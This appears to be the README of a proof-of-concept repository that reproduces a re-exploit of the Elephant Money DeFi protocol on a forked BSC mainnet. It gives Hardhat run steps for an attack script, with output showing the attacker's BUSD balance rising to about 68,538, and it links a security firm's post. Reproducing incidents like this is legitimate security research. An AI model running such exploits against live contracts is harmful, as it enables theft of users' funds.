# Elephant Money re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/bsc/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
BUSD balance of attacker: 0.0
Exploiting...
Exploit complete.
BUSD balance of attacker: 68538.734076340220478311
```
This means the attack is complete
> The block height of the fork is 16886438

## Link
* https://twitter.com/BlockSecTeam/status/1513966074357698563